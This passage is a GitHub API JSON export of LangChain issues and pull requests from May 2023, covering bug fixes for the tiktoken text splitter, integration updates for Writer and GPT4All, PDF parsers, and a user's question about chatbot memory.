            "received_events_url": "https://api.github.com/users/agola11/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-08T22:22:16Z",
        "updated_at": "2023-05-08T22:30:54Z",
        "closed_at": "2023-05-08T22:30:53Z",
        "author_association": "COLLABORATOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4364",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4364",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4364.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4364.patch",
            "merged_at": "2023-05-08T22:30:53Z"
        },
        "body": "Fixes # (issue)\r\nhttps://github.com/hwchase17/langchain/issues/4085\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4364/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4364/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4363",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4363/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4363/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4363/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4363",
        "id": 1700999426,
        "node_id": "PR_kwDOIPDwls5QCkF4",
        "number": 4363,
        "title": "Update writer integration",
        "user": {
            "login": "heathexer",
            "id": 10554991,
            "node_id": "MDQ6VXNlcjEwNTU0OTkx",
            "avatar_url": "https://avatars.githubusercontent.com/u/10554991?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/heathexer",
            "html_url": "https://github.com/heathexer",
            "followers_url": "https://api.github.com/users/heathexer/followers",
            "following_url": "https://api.github.com/users/heathexer/following{/other_user}",
            "gists_url": "https://api.github.com/users/heathexer/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/heathexer/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/heathexer/subscriptions",
            "organizations_url": "https://api.github.com/users/heathexer/orgs",
            "repos_url": "https://api.github.com/users/heathexer/repos",
            "events_url": "https://api.github.com/users/heathexer/events{/privacy}",
            "received_events_url": "https://api.github.com/users/heathexer/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-08T22:00:18Z",
        "updated_at": "2023-05-09T04:59:46Z",
        "closed_at": "2023-05-09T04:59:46Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4363",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4363",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4363.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4363.patch",
            "merged_at": "2023-05-09T04:59:46Z"
        },
        "body": "# Update Writer LLM integration\r\n\r\nChanges the parameters and base URL to be in line with Writer's current API.\r\nBased on the documentation on this page: https://dev.writer.com/reference/completions-1\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4363/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4363/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4362",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4362/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4362/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4362/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4362",
        "id": 1700981165,
        "node_id": "PR_kwDOIPDwls5QCgHQ",
        "number": 4362,
        "title": "Update gpt4all model",
        "user": {
            "login": "chakkaradeep",
            "id": 7882052,
            "node_id": "MDQ6VXNlcjc4ODIwNTI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/7882052?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/chakkaradeep",
            "html_url": "https://github.com/chakkaradeep",
            "followers_url": "https://api.github.com/users/chakkaradeep/followers",
            "following_url": "https://api.github.com/users/chakkaradeep/following{/other_user}",
            "gists_url": "https://api.github.com/users/chakkaradeep/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/chakkaradeep/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/chakkaradeep/subscriptions",
            "organizations_url": "https://api.github.com/users/chakkaradeep/orgs",
            "repos_url": "https://api.github.com/users/chakkaradeep/repos",
            "events_url": "https://api.github.com/users/chakkaradeep/events{/privacy}",
            "received_events_url": "https://api.github.com/users/chakkaradeep/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 5483526101,
                "node_id": "LA_kwDOIPDwls8AAAABRtf31Q",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/breaking",
                "name": "breaking",
                "color": "B60205",
                "default": false,
                "description": "Breaking change"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-08T21:40:49Z",
        "updated_at": "2023-06-08T18:29:50Z",
        "closed_at": "2023-06-08T18:29:50Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4362",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4362",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4362.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4362.patch",
            "merged_at": null
        },
        "body": "# Update GPT4All model\r\nThe GPT4All model is updated to use the newer pygpt4all bindings and the newer gpt4all-j models. \r\n\r\n**Who should review**\r\nLLM/Chat Wrappers\r\n        - @hwchase17\r\n        - @agola11 \r\n\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4362/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4362/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4361",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4361/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4361/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4361/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4361",
        "id": 1700972717,
        "node_id": "PR_kwDOIPDwls5QCeS8",
        "number": 4361,
        "title": "Dev2049/from tiktoken fix",
        "user": {
            "login": "dev2049",
            "id": 130488702,
            "node_id": "U_kgDOB8cZfg",
            "avatar_url": "https://avatars.githubusercontent.com/u/130488702?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dev2049",
            "html_url": "https://github.com/dev2049",
            "followers_url": "https://api.github.com/users/dev2049/followers",
            "following_url": "https://api.github.com/users/dev2049/following{/other_user}",
            "gists_url": "https://api.github.com/users/dev2049/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dev2049/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dev2049/subscriptions",
            "organizations_url": "https://api.github.com/users/dev2049/orgs",
            "repos_url": "https://api.github.com/users/dev2049/repos",
            "events_url": "https://api.github.com/users/dev2049/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dev2049/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-08T21:31:54Z",
        "updated_at": "2023-05-08T23:36:40Z",
        "closed_at": "2023-05-08T23:36:39Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4361",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4361",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4361.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4361.patch",
            "merged_at": "2023-05-08T23:36:39Z"
        },
        "body": "# Fix TextSplitter.from_tiktoken\r\n\r\nThanks to @danb27 for the fix! Minor update\r\n<!--\r\nThank you for contributing to LangChain! Your PR will appear in our next release under the title you set. Please make sure it highlights your valuable contribution.\r\n\r\nReplace this with a description of the change, the issue it fixes (if applicable), and relevant context. List any dependencies required for this change.\r\n\r\nAfter you're done, someone will review your PR. They may suggest improvements. If no one reviews your PR within a few days, feel free to @-mention the same people again, as notifications can get lost.\r\n-->\r\n\r\n<!-- Remove if not applicable -->\r\n\r\nFixes https://github.com/hwchase17/langchain/issues/4357\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4361/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4361/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4359",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4359/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4359/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4359/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4359",
        "id": 1700838616,
        "node_id": "PR_kwDOIPDwls5QCAWY",
        "number": 4359,
        "title": "Harrison/new search",
        "user": {
            "login": "hwchase17",
            "id": 11986836,
            "node_id": "MDQ6VXNlcjExOTg2ODM2",
            "avatar_url": "https://avatars.githubusercontent.com/u/11986836?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/hwchase17",
            "html_url": "https://github.com/hwchase17",
            "followers_url": "https://api.github.com/users/hwchase17/followers",
            "following_url": "https://api.github.com/users/hwchase17/following{/other_user}",
            "gists_url": "https://api.github.com/users/hwchase17/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/hwchase17/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/hwchase17/subscriptions",
            "organizations_url": "https://api.github.com/users/hwchase17/orgs",
            "repos_url": "https://api.github.com/users/hwchase17/repos",
            "events_url": "https://api.github.com/users/hwchase17/events{/privacy}",
            "received_events_url": "https://api.github.com/users/hwchase17/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 5454193895,
                "node_id": "LA_kwDOIPDwls8AAAABRRhk5w",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/lgtm",
                "name": "lgtm",
                "color": "0E8A16",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-08T19:56:16Z",
        "updated_at": "2023-05-11T00:09:17Z",
        "closed_at": "2023-05-11T00:09:16Z",
        "author_association": "COLLABORATOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4359",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4359",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4359.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4359.patch",
            "merged_at": "2023-05-11T00:09:16Z"
        },
        "body": null,
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4359/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4359/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4358",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4358/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4358/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4358/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4358",
        "id": 1700835685,
        "node_id": "PR_kwDOIPDwls5QB_tp",
        "number": 4358,
        "title": "fix model name not being passed to __init__ when using from_tiktoken_encoder",
        "user": {
            "login": "danb27",
            "id": 42096328,
            "node_id": "MDQ6VXNlcjQyMDk2MzI4",
            "avatar_url": "https://avatars.githubusercontent.com/u/42096328?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/danb27",
            "html_url": "https://github.com/danb27",
            "followers_url": "https://api.github.com/users/danb27/followers",
            "following_url": "https://api.github.com/users/danb27/following{/other_user}",
            "gists_url": "https://api.github.com/users/danb27/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/danb27/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/danb27/subscriptions",
            "organizations_url": "https://api.github.com/users/danb27/orgs",
            "repos_url": "https://api.github.com/users/danb27/repos",
            "events_url": "https://api.github.com/users/danb27/events{/privacy}",
            "received_events_url": "https://api.github.com/users/danb27/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2023-05-08T19:53:37Z",
        "updated_at": "2023-05-08T21:17:39Z",
        "closed_at": "2023-05-08T21:12:47Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4358",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4358",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4358.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4358.patch",
            "merged_at": "2023-05-08T21:12:47Z"
        },
        "body": "# Fix model name not being passed to __init__ when using from_tiktoken_encoder\r\n\r\n<!--\r\nThank you for contributing to LangChain! Your PR will appear in our next release under the title you set. Please make sure it highlights your valuable contribution.\r\n\r\nReplace this with a description of the change, the issue it fixes (if applicable), and relevant context. List any dependencies required for this change.\r\n\r\nAfter you're done, someone will review your PR. They may suggest improvements. If no one reviews your PR within a few days, feel free to @-mention the same people again, as notifications can get lost.\r\n-->\r\n\r\n<!-- Remove if not applicable -->\r\n\r\nFixes https://github.com/hwchase17/langchain/issues/4357\r\n\r\n\r\n## Before submitting\r\n\r\n<!-- If you're adding a new integration, include an integration test and an example notebook showing its use! -->\r\n\r\n## Who can review?\r\n\r\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested:\r\n\r\n<!-- For a quicker response, figure out the right person to tag with @\r\n\r\n        @hwchase17 - project lead\r\n\r\n        Tracing / Callbacks\r\n        - @agola11\r\n\r\n        Async\r\n        - @agola11\r\n\r\n        DataLoader Abstractions\r\n        - @eyurtsev\r\n\r\n        LLM/Chat Wrappers\r\n        - @hwchase17\r\n        - @agola11\r\n\r\n        Tools / Toolkits\r\n        - @vowelparrot\r\n -->\r\n@hwchase17 ",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4358/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4358/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4357",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4357/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4357/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4357/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4357",
        "id": 1700828804,
        "node_id": "I_kwDOIPDwls5lYJaE",
        "number": 4357,
        "title": "TokenTextSplitter ignores model_name when using from_tiktoken_encoder",
        "user": {
            "login": "danb27",
            "id": 42096328,
            "node_id": "MDQ6VXNlcjQyMDk2MzI4",
            "avatar_url": "https://avatars.githubusercontent.com/u/42096328?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/danb27",
            "html_url": "https://github.com/danb27",
            "followers_url": "https://api.github.com/users/danb27/followers",
            "following_url": "https://api.github.com/users/danb27/following{/other_user}",
            "gists_url": "https://api.github.com/users/danb27/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/danb27/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/danb27/subscriptions",
            "organizations_url": "https://api.github.com/users/danb27/orgs",
            "repos_url": "https://api.github.com/users/danb27/repos",
            "events_url": "https://api.github.com/users/danb27/events{/privacy}",
            "received_events_url": "https://api.github.com/users/danb27/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-08T19:47:49Z",
        "updated_at": "2023-05-08T23:36:41Z",
        "closed_at": "2023-05-08T23:36:41Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### System Info\n\nlangchain v0.0.162\r\npython3.10\n\n### Who can help?\n\n@hwchase17 I believe issue was introduced here: https://github.com/hwchase17/langchain/pull/2963\r\n\r\nThis works when calling `__init__` directly, but the model_name is not passed to `__init__` when using `from_tiktoken_encoder()`\r\n\r\n\n\n### Information\n\n- [ ] The official example notebooks/scripts\n- [X] My own modified scripts\n\n### Related Components\n\n- [ ] LLMs/Chat Models\n- [ ] Embedding Models\n- [ ] Prompts / Prompt Templates / Prompt Selectors\n- [ ] Output Parsers\n- [ ] Document Loaders\n- [ ] Vector Stores / Retrievers\n- [ ] Memory\n- [ ] Agents / Agent Executors\n- [ ] Tools / Toolkits\n- [ ] Chains\n- [ ] Callbacks/Tracing\n- [ ] Async\n\n### Reproduction\n\n```\r\nprint(TokenTextSplitter()._tokenizer)  # <Encoding 'gpt2'>\r\nprint(TokenTextSplitter(model_name=\"gpt-3.5-turbo\")._tokenizer)  # <Encoding 'cl100k_base'>\r\nprint(TokenTextSplitter.from_tiktoken_encoder(model_name=\"gpt-3.5-turbo\")._tokenizer)  # <Encoding 'gpt2'>\r\n```\n\n### Expected behavior\n\n```\r\nprint(TokenTextSplitter()._tokenizer)  # <Encoding 'gpt2'>\r\nprint(TokenTextSplitter(model_name=\"gpt-3.5-turbo\")._tokenizer)  # <Encoding 'cl100k_base'>\r\nprint(TokenTextSplitter.from_tiktoken_encoder(model_name=\"gpt-3.5-turbo\")._tokenizer)  # <Encoding 'cl100k_base'>\r\n```",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4357/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4357/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4356",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4356/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4356/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4356/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4356",
        "id": 1700825126,
        "node_id": "PR_kwDOIPDwls5QB9an",
        "number": 4356,
        "title": "Add PDF parser implementations",
        "user": {
            "login": "eyurtsev",
            "id": 3205522,
            "node_id": "MDQ6VXNlcjMyMDU1MjI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3205522?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/eyurtsev",
            "html_url": "https://github.com/eyurtsev",
            "followers_url": "https://api.github.com/users/eyurtsev/followers",
            "following_url": "https://api.github.com/users/eyurtsev/following{/other_user}",
            "gists_url": "https://api.github.com/users/eyurtsev/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/eyurtsev/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/eyurtsev/subscriptions",
            "organizations_url": "https://api.github.com/users/eyurtsev/orgs",
            "repos_url": "https://api.github.com/users/eyurtsev/repos",
            "events_url": "https://api.github.com/users/eyurtsev/events{/privacy}",
            "received_events_url": "https://api.github.com/users/eyurtsev/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-08T19:44:51Z",
        "updated_at": "2023-05-09T14:24:18Z",
        "closed_at": "2023-05-09T14:24:17Z",
        "author_association": "COLLABORATOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4356",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4356",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4356.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4356.patch",
            "merged_at": "2023-05-09T14:24:17Z"
        },
        "body": "# Add PDF parser implementations\r\n\r\nThis PR separates the data loading from the parsing for a number of existing\r\nPDF loaders.\r\n\r\nParser tests have been designed to help encourage developers to create a\r\nconsistent interface for parsing PDFs.\r\n\r\nThis interface can be made more consistent in the future by adding information\r\ninto the initializer on desired behavior with respect to splitting by page etc.\r\n\r\nThis code is expected to be backwards compatible -- with the exception of a bug fix with pymupdf parser which was returning `bytes` in the page content rather than strings.\r\n\r\nAlso changing the lazy parser method of document loader to return an Iterator rather than Iterable over documents.\r\n\r\n## Before submitting\r\n\r\n<!-- If you're adding a new integration, include an integration test and an example notebook showing its use! -->\r\n\r\n## Who can review?\r\n\r\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested:\r\n\r\n@\r\n\r\n<!-- For a quicker response, figure out the right person to tag with @\r\n\r\n        @hwchase17 - project lead\r\n\r\n        Tracing / Callbacks\r\n        - @agola11\r\n\r\n        Async\r\n        - @agola11\r\n\r\n        DataLoader Abstractions\r\n        - @eyurtsev\r\n\r\n        LLM/Chat Wrappers\r\n        - @hwchase17\r\n        - @agola11\r\n\r\n        Tools / Toolkits\r\n        - @vowelparrot\r\n -->\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4356/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4356/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4355",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4355/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4355/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4355/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4355",
        "id": 1700812707,
        "node_id": "I_kwDOIPDwls5lYFej",
        "number": 4355,
        "title": "ConversationalRetrievalChain + Memory: Can only remember partial memory",
        "user": {
            "login": "hanqing-blend",
            "id": 124721025,
            "node_id": "U_kgDOB28XgQ",
            "avatar_url": "https://avatars.githubusercontent.com/u/124721025?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/hanqing-blend",
            "html_url": "https://github.com/hanqing-blend",
            "followers_url": "https://api.github.com/users/hanqing-blend/followers",
            "following_url": "https://api.github.com/users/hanqing-blend/following{/other_user}",
            "gists_url": "https://api.github.com/users/hanqing-blend/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/hanqing-blend/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/hanqing-blend/subscriptions",
            "organizations_url": "https://api.github.com/users/hanqing-blend/orgs",
            "repos_url": "https://api.github.com/users/hanqing-blend/repos",
            "events_url": "https://api.github.com/users/hanqing-blend/events{/privacy}",
            "received_events_url": "https://api.github.com/users/hanqing-blend/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2023-05-08T19:34:53Z",
        "updated_at": "2023-11-26T16:09:44Z",
        "closed_at": "2023-11-26T16:09:43Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Issue you'd like to raise.\n\nHi, I'm creating a pdf chatbot with memory and the chain I use is ConversationalRetrievalChain + ConversationBufferMemory, but it seems that it can only remember some chat history. Does anyone have an idea of the reason?\r\n\r\nIt works well on a question like `can you summarize the answer?`,\r\nbut it cannot remember the first question I asked, \r\n```python\r\nquery = \"Hi, what is my first question?\"\r\nresult = qa({\"question\": query})\r\nprint(result['answer'])\r\n```\r\n```\r\nI'm sorry, but I don't have access to that information as our conversation history is not stored. Is there anything else I can help you with?\r\n```\r\n\r\nHere is my code:\r\n```python\r\ndef get_chat_history(inputs) -> str:\r\n    res = []\r\n    for human, ai in inputs:\r\n        res.append(f\"Human:{human}\\nAI:{ai}\")\r\n    return \"\\n\".join(res)\r\n\r\nmemory = ConversationBufferMemory(\r\n        memory_key='chat_history', return_messages=True, output_key='answer')\r\n\r\n# Create conversation chain that uses our vectordb as retriver, this also allows for chat history management\r\nqa = ConversationalRetrievalChain.from_llm(ChatOpenAI(temperature=0,model_name='gpt-3.5-turbo'), db.as_retriever(),memory=memory,\r\n    get_chat_history=get_chat_history,\r\n    return_source_documents=True)\r\n\r\n```\n\n### Suggestion:\n\n_No response_",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4355/reactions",
            "total_count": 2,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4355/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4354",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4354/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4354/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4354/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4354",
        "id": 1700786590,
        "node_id": "PR_kwDOIPDwls5QB1CI",
        "number": 4354,
        "title": "Add support for Qdrant nested filter",
        "user": {
            "login": "avsolatorio",
            "id": 3009596,
            "node_id": "MDQ6VXNlcjMwMDk1OTY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3009596?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/avsolatorio",
            "html_url": "https://github.com/avsolatorio",
            "followers_url": "https://api.github.com/users/avsolatorio/followers",
            "following_url": "https://api.github.com/users/avsolatorio/following{/other_user}",
            "gists_url": "https://api.github.com/users/avsolatorio/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/avsolatorio/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/avsolatorio/subscriptions",
            "organizations_url": "https://api.github.com/users/avsolatorio/orgs",
            "repos_url": "https://api.github.com/users/avsolatorio/repos",
            "events_url": "https://api.github.com/users/avsolatorio/events{/privacy}",
            "received_events_url": "https://api.github.com/users/avsolatorio/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-08T19:14:22Z",
        "updated_at": "2023-05-09T17:34:12Z",
        "closed_at": "2023-05-09T17:34:12Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4354",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4354",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4354.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4354.patch",
            "merged_at": "2023-05-09T17:34:12Z"
        },
